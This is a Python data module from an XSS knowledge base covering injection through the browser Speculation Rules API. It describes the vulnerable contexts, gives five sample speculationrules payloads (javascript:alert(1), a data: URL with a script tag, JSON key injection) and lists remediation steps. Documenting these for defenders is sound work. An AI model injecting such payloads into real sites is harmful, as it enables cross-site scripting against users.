#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Speculation Rules API Context - Data Module
"""

DESCRIPTION = """
Speculation Rules API allows browsers to prefetch and prerender pages.
The API uses JSON rules that can be exploited for XSS if user input is injected
into speculation rules, allowing navigation to malicious URLs or execution of scripts.

Vulnerability occurs when:
- User-controlled data is injected into speculation rules JSON
- URLs in rules are user-controlled
- Prefetch/prerender targets contain user input
- Rules structure is manipulated via user input

Common injection points:
- urls array values
- source values
- where conditions
- eagerness settings
- JSON structure manipulation
"""

ATTACK_VECTOR = """
1. URL injection in rules:
   <script type="speculationrules">
   {"prefetch":[{"source":"list","urls":["USER_INPUT"]}]}
   </script>

2. JavaScript protocol:
   <script type="speculationrules">
   {"prefetch":[{"source":"list","urls":["javascript:alert(1)"]}]}
   </script>

3. Data URL injection:
   <script type="speculationrules">
   {"prefetch":[{"source":"list","urls":["data:text/html,<script>alert(1)</script>"]}]}
   </script>

4. JSON injection:
   <script type="speculationrules">
   {"prefetch":[{"source":"list","urls":["/page"]}],"USER_INPUT":"value"}
   </script>

5. Prerender with injection:
   <script type="speculationrules">
   {"prerender":[{"source":"list","urls":["USER_INPUT"]}]}
   </script>
"""

REMEDIATION = """
1. Never allow user input in speculation rules JSON
2. Whitelist allowed URLs for prefetch/prerender
3. Validate all URLs against allowlist
4. Block javascript: and data: protocols
5. Sanitize JSON before parsing speculation rules
6. Use Content Security Policy (CSP)
7. Validate speculation rules structure
8. Audit all speculation rules generation code
"""
